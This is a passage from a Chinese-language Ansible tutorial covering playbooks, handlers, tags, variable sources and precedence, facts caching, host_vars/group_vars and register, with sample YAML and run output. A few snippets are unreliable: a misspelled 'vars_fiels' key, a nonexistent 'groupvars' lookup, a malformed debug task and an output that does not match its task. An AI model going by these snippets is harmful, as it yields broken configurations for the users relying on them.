功能的构建块，它们封装了各种不同类型的任务，例如远程执行命令、文件操作、软件包管理等。\n变量: 你可以在 Playbook 中使用变量来存储数据，如主机名、IP 地址、配置选项等。变量可以提高可维护性和可重用性。\n条件和循环: Playbook 支持条件语句和循环，允许你在特定情况下执行不同的操作，或者在多个主机上重复执行任务。\n角色: 角色是一种组织和复用 Playbook 的方式，可以将相关任务和变量组织到一个结构化的目录中，以便更好地管理和维护。\n总之，Playbook 是 Ansible 中定义和管理自动化任务的核心部分，它使你能够以可维护且可扩展的方式管理远程主机上的配置和操作。\n3.1.1 Playbook 组成 一个 playbook(剧本)文件是一个YAML语言编写的文本文件 通常一个playbook只包括一个play 一个 play的主要包括两部分: 主机和tasks. 即实现在指定一组主机上执行一个tasks定义好的任务列表。 一个tasks中可以有一个或多个task任务 每一个Task本质上就是调用ansible的一个module 在复杂场景中,一个playbook中也可以包括多个play，实现对多组不同的主机执行不同的任务 以下是一个示例 Playbook，展示了如何通过多个 play 执行不同任务：\n--- # 这是一个 Ansible Playbook 示例，用于展示多个 play 的用法 # 第一个 play：配置 Web 服务器 - name: 配置 Web 服务器 hosts: web_servers tasks: - name: 安装 Apache yum: name: httpd state: present - name: 启动 Apache 服务 service: name: httpd state: started # 第二个 play：配置数据库服务器 - name: 配置数据库服务器 hosts: db_servers tasks: - name: 安装 MySQL yum: name: mysql-server state: present - name: 启动 MySQL 服务 service: name: mysqld state: started 在上面的示例中，我们有两个 play：\n第一个 play:\n名称：配置 Web 服务器 主机：web_servers 主机组 任务： 安装 Apache 软件包 启动 Apache 服务 第二个 play:\n名称：配置数据库服务器 主机：db_servers 主机组 任务： 安装 MySQL 软件包 启动 MySQL 服务 每个 play 都独立执行，并且可以在不同的主机组上执行不同的任务。在复杂的场景中，这种结构可以让你更有效地管理和组织自动化任务。注释中提供了每个 play 所涉及的步骤和任务的描述，以帮助你理解 Playbook 的结构和功能。\n2.1.2 Playbook 和 Ad-Hoc 对比 Ansible 提供了两种主要的操作方式：Playbook 和 Ad-Hoc 命令，用于在远程主机上执行任务。下面是它们之间的详细对比：\nPlaybook:\n描述性操作：Playbook 是用 YAML 文件编写的，以声明性的方式描述了要执行的任务和配置。它更适合用于复杂的、长期的自动化任务。\n复杂性：Playbook 支持多个主机、多个任务、变量、循环和条件等复杂的操作。它适合管理全面的配置和部署。\n结构化组织：Playbook 允许将任务组织成逻辑的 play，每个 play 都可以在特定的主机组上执行。这使得任务更加模块化和可扩展。\n可维护性：由于它是文本文件，Playbook 可以轻松地进行版本控制、文档化和共享。适合长期维护和团队协作。\n变量和模板：Playbook 支持定义变量和使用 Jinja2 模板生成配置文件，从而实现更高度的可定制性。\nAd-Hoc 命令:\n即时性操作：Ad-Hoc 命令是直接在命令行中执行的，适用于即时需要的、单次性的任务。\n命令行操作：Ad-Hoc 命令更适合临时操作，无需编写或保存文件，直接在命令行中执行。\n简单任务：它适合执行简单的、快速的任务，如查看系统状态、执行一次性命令等。\n命令模块：Ad-Hoc 命令使用命令模块来执行任务，它们比 Playbook 的模块少，功能相对有限。\n难以维护：由于命令直接在命令行中执行，Ad-Hoc 命令的可读性差，不适合长期维护和跟踪。\n不支持复杂逻辑：Ad-Hoc 命令不支持像 Playbook 中的复杂逻辑、条件判断和循环。\n选择适用场景：\n如果你需要执行复杂的多步骤任务、配置管理和自动化流程，应优先使用 Playbook。 如果你需要快速执行一次性的任务，例如系统诊断、快速检查等，可以使用 Ad-Hoc 命令。 最终，选择 Playbook 还是 Ad-Hoc 命令取决于你的任务需求、复杂性和长期维护的要求。\n3.2 Plabook 核心组件 当涉及 Ansible Playbook 的组件时，以下是每个组件的简单示例说明：\n主机清单（Inventory）示例： 主机清单文件列出了 Ansible 将要管理的主机和主机组。这是一个简单的主机清单示例：\n[web_servers] web1 ansible_host=192.168.1.10 web2 ansible_host=192.168.1.11 [db_servers] db1 ansible_host=192.168.1.20 变量（Variables）示例： 你可以在 Playbook 中使用变量来设置不同的值，以便在不同的环境中重用配置。这是一个简单的变量示例：\n--- - name: Example Playbook with Variables hosts: web_servers vars: http_port: 80 tasks: - name: Display HTTP Port debug: msg: \u0026#34;HTTP port is {{ http_port }}\u0026#34; 任务（Tasks）示例： 任务是 Playbook 中的操作单元，由模块组成。这是一个简单的任务示例：\n--- - name: Example Task hosts: web_servers tasks: - name: Ensure Apache is installed yum: name: httpd state: present 处理配置（Handlers）示例： 处理配置用于在任务执行后触发一些操作，通常用于重新启动服务或重新加载配置。这是一个简单的处理配置示例：\n--- - name: Example Playbook with Handlers hosts: web_servers tasks: - name: Ensure Apache is installed yum: name: httpd state: present notify: - Restart Apache handlers: - name: Restart Apache service: name: httpd state: restarted 剧本（Play）示例： 剧本由一个或多个任务组成，用于在一组主机上执行操作。这是一个包含多个任务的剧本示例：\n--- - name: Example Play hosts: web_servers tasks: - name: Ensure Apache is installed yum: name: httpd state: present - name: Copy index.html copy: src: /path/to/index.html dest: /var/www/html/ 在每个示例中，我提供了一个基本的演示，说明了每个组件的用法和作用。这应该有助于你更好地理解 Ansible Playbook 的不同组件以及它们是如何一起工作的。\n3.3 Playbook 命令 命令格式\nansible-playbook \u0026lt;filename.yml\u0026gt; ... [options] 常见选项\n--syntax,--syntax-check # 语法检查,功能相当于bash -n -C --check # 模拟执行 dry run ，只检测可能会发生的改变，但不真正执行操作 --list-hosts # 列出运行任务的主机 --list-tags # 列出 tag --list-tasks # 列出 task --limit HOST_NAME # 只针对主机列表中的特定主机执行 -i INVENTORY_PATH, --inventory INVENTORY_PATH # 指定主机清单文件, 通常一个项对应一个主机清单文件 --start-at-task START_AT_TASK # 从指定 task 开始执行, 而非从头开始, START_AT_TASK为任务的 name -v -vv -vvv # 显示过程 范例：打印 hello world\n[root@ansible playbooks]# cat hello.yaml --- - hosts: remote gather_facts: no # 不收集目标主机信息，加快执行速度 tasks: - name: hello command: echo \u0026#34;hello world!\u0026#34; [root@ansible playbooks]# ansible-playbook hello.yaml 示例：\n# 列出 playbook 中的主机 [root@ansible playbooks]# ansible-playbook hello.yaml --list-hosts playbook: hello.yaml play #1 (remote): remote\tTAGS: [] pattern: [u\u0026#39;remote\u0026#39;] hosts (1): remote # 列出 playbook 中的任务 [root@ansible playbooks]# ansible-playbook hello.yaml --list-tasks playbook: hello.yaml play #1 (remote): remote\tTAGS: [] tasks: hello\tTAGS: [] 3.4 ignore_errors 在 playbook 执行时，如果某个 task 出错，则后续任务不会再执行\n[root@ansible playbooks]# cat test_ignore.yaml --- - hosts: remote gather_facts: no tasks: - name: task1 command: /bin/false ignore_errors: yes # 忽略该task的报错，继续执行后续任务 - name: task2 command: echo \u0026#34;hello world!\u0026#34; - hosts: remote gather_facts: no tasks: - name: task3 command: /bin/false # 此步骤报错，不再执行后续任务 - name: task4 command: echo \u0026#34;END---\u0026#34; #实际运行效果：task4不会执行 [root@ansible playbooks]# ansible-playbook test_ignore.yaml PLAY [remote] *********************************************************************** TASK [task1] ************************************************************************ fatal: [remote]: FAILED! =\u0026gt; {\u0026#34;ansible_facts\u0026#34;: {\u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34;}, \u0026#34;changed\u0026#34;: true, \u0026#34;cmd\u0026#34;: [\u0026#34;/bin/false\u0026#34;], \u0026#34;delta\u0026#34;: \u0026#34;0:00:00.272950\u0026#34;, \u0026#34;end\u0026#34;: \u0026#34;2023-08-23 16:10:01.027320\u0026#34;, \u0026#34;msg\u0026#34;: \u0026#34;non-zero return code\u0026#34;, \u0026#34;rc\u0026#34;: 1, \u0026#34;start\u0026#34;: \u0026#34;2023-08-23 16:10:00.754370\u0026#34;, \u0026#34;stderr\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stderr_lines\u0026#34;: [], \u0026#34;stdout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stdout_lines\u0026#34;: []} ...ignoring TASK [task2] ************************************************************************ changed: [remote] PLAY [remote] *********************************************************************** TASK [task3] ************************************************************************ fatal: [remote]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: true, \u0026#34;cmd\u0026#34;: [\u0026#34;/bin/false\u0026#34;], \u0026#34;delta\u0026#34;: \u0026#34;0:00:00.276205\u0026#34;, \u0026#34;end\u0026#34;: \u0026#34;2023-08-23 16:10:02.161360\u0026#34;, \u0026#34;msg\u0026#34;: \u0026#34;non-zero return code\u0026#34;, \u0026#34;rc\u0026#34;: 1, \u0026#34;start\u0026#34;: \u0026#34;2023-08-23 16:10:01.885155\u0026#34;, \u0026#34;stderr\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stderr_lines\u0026#34;: [], \u0026#34;stdout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stdout_lines\u0026#34;: []} PLAY RECAP ************************************************************************** remote : ok=2 changed=2 unreachable=0 failed=1 skipped=0 rescued=0 ignored=1 3.5 handlers 和 notify Handlers 本质是 task list ，类似于 MySQL 中的触发器触发的行为，其中的 task 与前述的 task 并没有本质上的不同，只有在关注的资源发生变化时，才会采取一定的操作。\nNotify 对应的 action 在所有 task 都执行完才会最后被触发，这样可避免多个 task 多次改变发生时每次都触发执行指定的操作，Handlers 仅在所有的变化发生完成后一次性地执行指定操作。\n在 notify 中列出的操作称为 handler ，也即 notify 中调用 handler 中定义的操作\n注意:\n如果多个 task 通知了相同的handlers， 此handlers仅会在所有task结束后运行一 次。 只有 notify 对应的 task 发生改变了才会通知 handlers，没有改变则不会触发handlers handlers 是在所有前面的 tasks 都成功执行才会执行，如果前面任何一个 task 失败，会导致 handler 跳过执行 示例：执行两个 handle\n--- - hosts: remote gather_facts: no tasks: - name: task1 command: /bin/true notify: # 触发 handlers 中的任务执行 - get up - go to school handlers: - name: get up debug: msg: \u0026#34;Get it\u0026#34; - name: go to school debug: msg: \u0026#34;I am going to school\u0026#34; [root@ansible playbooks]# ansible-playbook test.yaml PLAY [remote] ****************************************************************** TASK [task1] ******************************************************************* changed: [remote] RUNNING HANDLER [get up] ******************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;Get it\u0026#34; } RUNNING HANDLER [go to school] ************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;I am going to school\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=3 changed=1 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 如果有任意一个task 执行失败，handlers 中的任务不会执行（即使加了ignore_errors），此时可以加上force_handlers: yes来强制执行 handlers\n--- - hosts: remote gather_facts: no force_handlers: yes # 忽略任一 task 执行报错，继续其他 task 及其 handler tasks: - name: task1 command: /bin/true notify: # 触发 handlers 中的任务执行 - get up - name: task2 command: /bin/false notify: - go to school\t# 由于task2 报错，不会通知相应的handler执行 handlers: - name: get up debug: msg: \u0026#34;Get it\u0026#34; - name: go to school debug: msg: \u0026#34;I am going to school\u0026#34; [root@ansible playbooks]# ansible-playbook test.yaml PLAY [remote] ****************************************************************** TASK [task1] ******************************************************************* changed: [remote] TASK [task2] ******************************************************************* fatal: [remote]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: true, \u0026#34;cmd\u0026#34;: [\u0026#34;/bin/false\u0026#34;], \u0026#34;delta\u0026#34;: \u0026#34;0:00:00.273631\u0026#34;, \u0026#34;end\u0026#34;: \u0026#34;2023-08-24 08:52:38.649403\u0026#34;, \u0026#34;msg\u0026#34;: \u0026#34;non-zero return code\u0026#34;, \u0026#34;rc\u0026#34;: 1, \u0026#34;start\u0026#34;: \u0026#34;2023-08-24 08:52:38.375772\u0026#34;, \u0026#34;stderr\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stderr_lines\u0026#34;: [], \u0026#34;stdout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stdout_lines\u0026#34;: []} RUNNING HANDLER [get up] ******************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;Get it\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=2 changed=1 unreachable=0 failed=1 skipped=0 rescued=0 ignored=0 3.6 Playbook 中使用 tags Tags — Ansible Documentation\n默认情况下，ansible 会执行 playbook 中的所有任务。根据需要，可以给指定的 task 指定标签，即 tag，而后在执行 playbook 时，带上对应的 tag 以运行指定的 task。\n一个 task 可以有多个 tag 内置的 tag 有： tagged，untagged 和 all，它们分别是仅运行有tag，没有tag的任务和所有任务。 范例：\n[root@ansible playbooks]# cat test_tags.yml --- - hosts: remote remote_user: root gather_facts: no tasks: - name: task1 debug: msg: \u0026#34;task1\u0026#34; tags: - tag1 - tag_one - name: task2 debug: msg: \u0026#34;task2\u0026#34; - name: task3 debug: msg: \u0026#34;task3\u0026#34; # 列出所有 tag [root@ansible playbooks]# ansible-playbook test_tags.yml --list-tags playbook: test_tags.yml play #1 (remote): remote\tTAGS: [] TASK TAGS: [tag1, tag_one] # 只运行带有 tag1 的 task [root@ansible playbooks]# ansible-playbook test_tags.yml -t tag1 PLAY [remote] ****************************************************************** TASK [task1] ******************************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;task1\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=1 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 # 只运行没有 tag 的 task [root@ansible playbooks]# ansible-playbook test_tags.yml -t untagged PLAY [remote] ****************************************************************** TASK [task2] ******************************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;task2\u0026#34; } TASK [task3] ******************************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;task3\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=2 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 # 不执行有特定 tag 的 task [root@ansible playbooks]# ansible-playbook test_tags.yml --skip-tags tag_one # 不执行没有 tag 的 task [root@ansible playbooks]# ansible-playbook test_tags.yml --skip-tags untagged 3.7 Playbook 中使用变量 在 Ansible 中，setup 模块用于收集有关远程主机的各种信息，这些信息被称为 \u0026ldquo;facts\u0026rdquo;。这些 facts 包括有关操作系统、硬件、网络、内存、CPU 等的信息，可以用于编写更加灵活和动态的剧本。使用 setup 模块可以通过 Ansible 收集远程主机的 facts。调用 playbook 时默认调用此模块，可通过 gather_facts: no 来禁止。\n变量命令规则：由字母，数字，下划线组成且只能以字母开头\n变量调用方式：通过 {{ VARIBLE_NAME }} 调用变量，建议变量名前后加空格，且有时需要以双引号包裹 ”{{ VARIBLE_NAME }}“ （如：debug 模块中）\n变量来源：\nansible 的 setup 模块收集的 facts 变量\n通过命令行指定变量，优先级最高\nansible-playbook my_playbook.yml -e \u0026#34;my_variable=value\u0026#34; 在 playbook 中定义\n- name: Example Playbook hosts: servers vars: my_var: \u0026#34;Hello, Ansible!\u0026#34; tasks: - name: Display variable debug: var: my_var 在独立的YAML文件中定义，然后通过关键字 vars_files 引入\n- hosts: remote vars_fiels: - my_vars.yml 在主机清单文件中定义\n主机变量： 在主机清单（Inventory）中定义的变量，优先级高于组变量\n[my_hosts] host1 my_variable=host_value 组变量： 在主机清单中的组级别定义的变量。\n[my_group:vars] my_variable=group_value 在项目中针对主机和主机组定义\n在项目目录下创建 host_vars 和 group_vars 目录，在其中新建 YAML 文件定义变量\n在 role （角色）中定义\n在 Ansible 角色中，变量也有优先级，类似于 Ansible 的其他变量。角色内的变量可以分为几个不同的级别，优先级从高到低排列如下：\n角色任务变量（Role Task Variables）：这些变量在角色内的任务中定义，并且只在特定任务中生效。这些变量的优先级最高，会覆盖其他级别的变量。\n在角色任务中定义的变量，通常存储在任务中的 vars 部分：\n- name: Example role task debug: msg: \u0026#34;This is a task with a role-level variable\u0026#34; vars: task_variable: value 角色默认变量（Role Default Variables）：角色的默认变量存储在角色的 defaults 目录下。这些变量在角色内部被认为是默认设置，除非被其他级别的变量覆盖。\n角色默认变量存储在 roles/role_name/defaults/main.yml 文件中。\n角色变量（Role Variables）：在使用角色时，可以在主剧本中为角色设置变量。这些变量可以影响角色中的任务和默认变量。\n在主剧本中为角色设置变量的方式如下：\n- name: Playbook using a role hosts: target_hosts roles: - role: role_name vars: role_var: value 主机清单中的变量（Inventory Variables）：在主机清单中为主机或主机组定义的变量。这些变量在角色内也可以使用，但是其优先级较低。\n在主机清单中为主机定义变量的方式如下：\n[target_hosts] host1 ansible_ssh_host=192.168.1.1 role_var=value 变量优先级从高到低如下：\n1. 命令行 -e 传递的变量 2. playbook 中 2.1 vars_files 引入的变量 2.1 playbook 中 vars 变量定义 3. host_vars/主机名文件 4. 主机清单中的主机变量 5. group_vars 5.1 主机组名文件 5.2 all.yml 6. 主机清单中的组变量 总的来说，变量定义方式多而杂，实际使用时应避免在多个地方定义同一个变量，降低复杂度，从而降低维护成本，减少出错的可能性。\n3.7.1 使用 setup 模块中的变量 3.7.1.1 使用 facts 变量 本模块自动在playbook调用，生成的系统状态信息, 并将之存放在facts变量中\nfacts 包括的信息很多,如: 主机名, IP, CPU, 内存, 网卡等\nfacts 变量的实际使用场景案例\n通过facts变量获取被控端CPU的个数信息，从而生成不同的Nginx配置文件\n通过facts变量获取被控端内存大小信息，从而生成不同的memcached的配置文件\n通过facts变量获取被控端主机名称信息，从而生成不同的Zabbix配置文件\n通过facts变量获取被控端网卡信息，从而生成不同的主机名\n\u0026hellip;\u0026hellip;\n范例：\n# 获取网卡信息 [root@ansible playbooks]# ansible localhost -m setup -a \u0026#39;filter=\u0026#34;ansible_default_ipv4\u0026#34;\u0026#39; localhost | SUCCESS =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;ansible_default_ipv4\u0026#34;: { \u0026#34;address\u0026#34;: \u0026#34;192.168.146.128\u0026#34;, \u0026#34;alias\u0026#34;: \u0026#34;ens33\u0026#34;, \u0026#34;broadcast\u0026#34;: \u0026#34;192.168.146.255\u0026#34;, \u0026#34;gateway\u0026#34;: \u0026#34;192.168.146.254\u0026#34;, \u0026#34;interface\u0026#34;: \u0026#34;ens33\u0026#34;, \u0026#34;macaddress\u0026#34;: \u0026#34;00:0c:29:c6:1a:98\u0026#34;, \u0026#34;mtu\u0026#34;: 1500, \u0026#34;netmask\u0026#34;: \u0026#34;255.255.255.0\u0026#34;, \u0026#34;network\u0026#34;: \u0026#34;192.168.146.0\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;ether\u0026#34; } }, \u0026#34;changed\u0026#34;: false } # 查看主机名 [root@ansible playbooks]# ansible localhost -m setup -a \u0026#39;filter=\u0026#34;ansible_nodename\u0026#34;\u0026#39; localhost | SUCCESS =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;ansible_nodename\u0026#34;: \u0026#34;ansible\u0026#34; }, \u0026#34;changed\u0026#34;: false } # 根据主机名生成日志文件 [root@ansible playbooks]# vim touch_host_log.yaml [root@ansible playbooks]# ansible-playbook touch_host_log.yaml [root@ansible playbooks]# ansible remote -a \u0026#39;ls /tmp/remote.log\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; /tmp/remote.log # 获取网卡地址 [root@ansible playbooks]# cat show_ip_of_eth0.yaml --- - hosts: remote tasks: - name: show ens33 ip address of {{ ansible_facts[\u0026#34;eth0\u0026#34;][\u0026#34;ipv4\u0026#34;][\u0026#34;address\u0026#34;] }} debug: msg: Ip address {{ ansible_facts.ens33.ipv4.address }} - name: another way debug: Ip address {{ ansible_facts[\u0026#34;ens33\u0026#34;][\u0026#34;ipv4\u0026#34;][\u0026#34;address\u0026#34;] }} [root@ansible playbooks]# ansible-playbook show_ip_of_eth0.yaml PLAY [remote] ****************************************************************** TASK [Gathering Facts] ********************************************************* ok: [remote] TASK [show ens33 ip address of {{ ansible_facts[\u0026#34;eth0\u0026#34;][\u0026#34;ipv4\u0026#34;][\u0026#34;address\u0026#34;] }}] *** ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;Ip address 192.168.146.129\u0026#34; } TASK [another way] ************************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;Hello world!\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=3 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 3.7.1.2 性能优化 执行 playbook 时，默认启用 setup 模块收集目标主机的 facts 变量，会耗费一定时间。可选则以下两种方式进行配置\n如果不需要使用到目标主机的变量信息，可以通过 gather_facts: no 选项来关闭此行为\n--- - hosts: all gather_facts: no 在 Ansible 中，\u0026ldquo;facts 缓存\u0026rdquo; 是指将主机的事实数据（例如主机名、操作系统信息、IP 地址等）缓存起来，以便在后续的 Ansible 运行中重用这些数据，从而减少系统资源的使用和提高执行效率。\n要启用 Ansible 的 Facts 缓存功能，你可以在 Ansible 配置文件中进行设置。默认情况下，Ansible 将事实数据存储在内存中，但你也可以选择将其存储在磁盘上以实现持久性。\n以下是启用 Ansible Facts 缓存的配置示例：\n存储在内存中： 在 Ansible 配置文件中（通常是 /etc/ansible/ansible.cfg 或 ~/.ansible.cfg），添加以下配置行：\n[defaults] gathering = smart fact_caching = memory 存储在磁盘上： 要将 Facts 存储在磁盘上，你需要选择一个目录来保存缓存数据。在 Ansible 配置文件中添加以下配置行：\n[defaults] gathering = smart fact_caching = jsonfile fact_caching_connection = /path/to/cache_directory 将 /path/to/cache_directory 替换为你想要存储 Facts 缓存数据的实际目录路径。\n完成配置后，重新运行 Ansible 命令，它将使用 Facts 缓存来加速执行过程。\n请注意，以上配置示例适用于 Ansible 版本较新的情况。在特定的 Ansible 版本中，配置选项可能会有所不同。在使用前，请确保查阅与你所使用的 Ansible 版本相匹配的官方文档或手册。\n3.7.2 命令行中给 playbook 传递变量 在 Ansible 的 ansible-playbook 命令行中，可以使用 -e 选项来传递额外的变量给 playbook。这可以让你在运行 playbook 时动态地指定变量的值，而不必修改 playbook 文件本身。以下是传递变量的几种方式：\n传递单个变量：\nansible-playbook -e \u0026#34;variable_name=variable_value\u0026#34; playbook.yml 传递多个变量：\n如果你想传递多个变量，可以使用多个 -e 选项或者将多个变量放在一个引号中，用空格或逗号分隔。\nansible-playbook -e \u0026#34;variable1=value1 variable2=value2\u0026#34; playbook.yml 或者：\nansible-playbook -e \u0026#34;variable1=value1\u0026#34; -e \u0026#34;variable2=value2\u0026#34; playbook.yml 传递 yaml 变量文件\n假设你的 YAML 文件 vars.yml 如下：\n#vars.yml my_variable: \u0026#34;Hello, Ansible!\u0026#34; database_host: \u0026#34;db.example.com\u0026#34; database_port: 3306 通过 -e 选项传递此文件中的变量\nansible-playbook -e @vars.yaml playbook.yml 传递 JSON 文件：\n你也可以将变量保存在一个 JSON 格式的文件中，然后使用 -e 选项传递文件路径。\nansible-playbook -e @variables.json playbook.yml 其中，variables.json 是一个包含变量的 JSON 文件。\n无论你选择哪种方式，传递的变量都可以在 playbook 中使用，例如：\n[root@ansible playbooks]# cat playbook.yml --- - name: Example Playbook gather_facts: no hosts: remote tasks: - debug: var: my_variable [root@ansible playbooks]# ansible-playbook -e @vars.yaml playbook.yml PLAY [Example Playbook] ******************************************************** TASK [debug] ******************************************************************* ok: [remote] =\u0026gt; { \u0026#34;my_variable\u0026#34;: \u0026#34;Hello, Ansible!\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=1 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 在这个例子中，my_variable 变量的值将根据在命令行中传递的值进行设定。\n3.7.3 在 playbook 文件中定义变量 在Playbook级别定义变量：\n在Playbook中，你可以使用vars关键字来定义变量。这些变量将在整个Playbook中可用。\n--- - name: Example Playbook hosts: my_hosts vars: variable_name: variable_value tasks: - name: Task using variable debug: var: variable_name 变量之间相互引用:\n--- - name: Example Playbook hosts: localhost vars: remote_ip: \u0026#34;{{ ansible_default_ipv4.address }}\u0026#34; tasks: - name: Task using variable debug: var: remote_ip 3.7.4 在外部变量文件中定义变量： vars_files 中的文件路径是相对于当前工作目录的。如果变量文件位于 Playbook 文件的同一目录中，你可以直接提供文件名，如 vars_files: vars.yml。如果在其他目录中，就需要提供完整的相对或绝对路径。\n将变量存储在外部文件中，然后在Playbook中导入这些变量。这在需要共享变量的多个Playbook之间很有用。\n--- - name: Example Playbook hosts: my_hosts vars_files: - vars.yml tasks: - name: Task using variable debug: var: variable_name 外部变量文件 vars.yml 的内容：\nvariable_name: variable_value 3.7.5 在主机清单中定义变量 在Ansible中，你可以为主机和主机组定义变量，以便在Playbooks中使用这些变量来控制任务的行为。这有助于实现更灵活的配置和动态性。下面是关于如何在Ansible中为主机和主机组定义变量的详细信息：\n主机变量：\n你可以为每个具体的主机定义变量，这些变量只适用于该主机。在Ansible的Inventory文件（通常是INI格式或YAML格式）中，你可以像这样为主机定义变量：\nINI格式：\n[my_hosts] host1 ansible_ssh_host=192.168.1.1 [my_hosts:vars] some_variable=some_value YAML格式：\nmy_hosts: hosts: host1: ansible_ssh_host: 192.168.1.1 vars: some_variable: some_value 主机组变量：\n你可以为主机组定义变量，这些变量将应用于该主机组中的所有主机。同样，在Inventory文件中，你可以为主机组定义变量：\nINI格式：\n[my_hosts] host1 ansible_ssh_host=192.168.1.1 host2 ansible_ssh_host=192.168.1.2 [my_hosts:vars] some_variable=some_value YAML格式：\nmy_hosts: hosts: host1: ansible_ssh_host: 192.168.1.1 host2: ansible_ssh_host: 192.168.1.2 vars: some_variable: some_value 使用变量：\n在Playbook中，你可以使用定义的主机变量和主机组变量。例如：\n--- - name: Example Playbook hosts: my_hosts tasks: - name: Task using host variable debug: var: hostvars[inventory_hostname][\u0026#39;some_variable\u0026#39;] - name: Task using host group variable debug: var: groupvars[\u0026#39;my_hosts\u0026#39;][\u0026#39;some_variable\u0026#39;] - name: normal use debug: var: some_variable 上述代码中，hostvars[inventory_hostname]['some_variable'] 用于访问特定主机的变量，而 groupvars['my_hosts']['some_variable'] 用于访问主机组的变量。\n通过这些方法，你可以在Ansible中为主机和主机组定义变量，从而实现更加动态和可配置的Playbooks。\n3.7.6 host_vars 和 group_vars 在 Ansible 中，host_vars 和 group_vars 是用于管理主机和主机组变量的特殊目录。这些目录允许你在不同的级别为主机和主机组定义变量，以便在你的 Ansible 任务中使用。这样，你可以根据需要为不同的主机或主机组配置特定的变量值，而不必在每个任务中都手动指定这些值。\n以下是关于 host_vars 和 group_vars 的更详细介绍和使用方法：\n1. host_vars： host_vars 目录用于为单个主机定义变量。在这个目录下，你可以为每个主机创建一个单独的 YAML 文件，文件名与主机的名称匹配。这些变量将仅应用于特定的主机。\n目录结构示例：\n. ├── inventory.ini ├── host_vars │ ├── server1.yml │ ├── server2.yml │ └── ... └── group_vars ├── group1.yml ├── group2.yml └── ... 2. group_vars： group_vars 目录用于为主机组定义变量。主机组是在 Ansible 主机清单文件（通常是 inventory.ini）中定义的。你可以为每个主机组创建一个单独的 YAML 文件，文件名与主机组的名称匹配。这些变量将应用于主机组中的所有主机。\n使用方法：\n在你的 Ansible 项目目录中创建 host_vars 和 group_vars 目录。\n在 host_vars 目录中创建一个或多个 YAML 文件，每个文件对应一个主机，并在其中定义你希望在这些主机上使用的变量。\n在 group_vars 目录中创建一个或多个 YAML 文件，每个文件对应一个主机组，并在其中定义你希望在这些主机组上使用的变量。\n在 Ansible 主机清单文件（通常是 inventory.ini）中，将主机分配给相应的主机组。\n在你的 Ansible 任务中，你可以直接使用这些变量，Ansible 会自动加载它们。\n示例：\n假设你有两台主机：webserver1 和 webserver2，你还有一个主机组：webservers。你想要为每个主机和主机组定义一些变量。\nhost_vars/webserver1.yml:\n# host_vars/webserver1.yml app_port: 8080 app_env: production host_vars/webserver2.yml:\n# host_vars/webserver2.yml app_port: 8000 app_env: staging group_vars/webservers.yml:\n# group_vars/webservers.yml app_user: webuser app_path: /var/www/app inventory.ini:\n[webservers] webserver1 webserver2 playbook.yml:\n--- - name: Configure web servers hosts: webservers tasks: - name: Display app settings debug: msg: \u0026#34;App running on port {{ app_port }} with environment {{ app_env }}. User: {{ app_user }} Path: {{ app_path }}\u0026#34; 在这个示例中，webserver1 和 webserver2 分别有各自的变量，而 webservers 主机组共享了相同的变量。在任务中，你可以直接使用这些变量，Ansible 会将它们与相应的主机或主机组关联起来。\n使用 host_vars 和 group_vars 可以使你的 Ansible 项目更有结构，更易于维护，因为你可以将变量与主机和主机组关联起来，而不必在每个任务中都重复定义。\n3.7.7 register 在 Ansible 中，register 是一个用于捕获任务执行结果的关键字。通过使用 register，你可以将任务的输出、返回值或其他信息保存到一个变量中，以便后续任务可以使用这些信息。这在处理任务的输出、错误处理和条件执行方面非常有用。\n使用方法：\n在 Ansible playbook 的任务中，你可以使用 register 来捕获任务的输出。以下是一个基本的用法示例：\n--- - name: Execute a command hosts: myhosts tasks: - name: Run a command and capture the output command: echo \u0026#34;Hello, Ansible!\u0026#34; register: command_output - name: Display the captured output debug: var: command_output.stdout 在这个示例中，register: command_output 将捕获 echo 命令的输出，并将其保存在 command_output 变量中。接下来的任务使用 debug 模块来显示这个变量的值。\nregister 变量对象中包含多个属性，你可以根据需要使用它们。一些常用的属性包括：\nstdout：捕获任务的标准输出内容。 stderr：捕获任务的标准错误输出内容。 rc：捕获任务的返回代码（退出状态码）。 changed：指示任务是否导致了变化（True 或 False）。 以下是一个更复杂的示例，演示如何根据 register 变量的值来执行不同的任务：\n--- - name: Check if a file exists hosts: myhosts tasks: - name: Check file existence stat: path: /path/to/file.txt register: file_status - name: Display file status debug: msg: \u0026#34;File exists: {{ file_status.stat.exists }}\u0026#34; when: file_status.stat.exists - name: Create the file if it doesn\u0026#39;t exist file: path: /path/to/file.txt state: touch when: not file_status.stat.exists 在这个示例中，首先使用 stat 模块检查文件是否存在，并将结果保存在 file_status 变量中。接下来的两个任务根据 file_status 